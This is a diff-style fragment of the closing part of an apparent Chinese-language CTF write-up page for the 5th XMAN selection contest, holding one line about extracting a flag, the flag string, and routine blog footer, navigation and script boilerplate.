yYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/f88da837-3d50-4191-b2d6-8c0874735dfa/1628227223003208/fb88be86ff538bf5e307a88e601664e12f84be03.jpg"></p>
+<p>將其儲存出來後解壓可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Waw!_Y0u_D1d!_it_^_^&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%BD%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">簽到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyphp"><span class="toc-number">1.2.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyssti"><span class="toc-number">1.3.</span> <span class="toc-text">easyssti</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#try-all-volatility"><span class="toc-number">2.1.</span> <span class="toc-text">try_all_volatility</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/7b00520f.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&text=第五屆 XMAN 選拔賽"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&title=第五屆 XMAN 選拔賽"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&is_video=false&description=第五屆 XMAN 選拔賽"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第五屆 XMAN 選拔賽&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/7b00520f.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&title=第五屆 XMAN 選拔賽"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&title=第五屆 XMAN 選拔賽"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&title=第五屆 XMAN 選拔賽"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&title=第五屆 XMAN 選拔賽"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&name=第五屆 XMAN 選拔賽&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/7b00520f.html&t=第五屆 XMAN 選拔賽"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    
+      <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">湘ICP备20002800号</a>
+    
+    
+      <img no-lazy src="/images/beian.png"/>
+      <a href= "http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=43021102000188">湘公网安备43021102000188号</a>
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.8/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 2,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(i){i.imageLazyLoadSetting.processImages=a;var n=i.imageLazyLoadSetting.isSPA,o=i.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function a(){n&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(i.innerHeight*o||document.documentElement.clientHeight*o)&&function(){var t,e,i,n,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},i=new Image,n=t.getAttribute("data-original"),i.onload=function(){t.src=n,e&&e()},t.src!==n&&(i.src=n)}()}a(),i.addEventListener("scroll",function(){var t,e;t=a,e=i,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
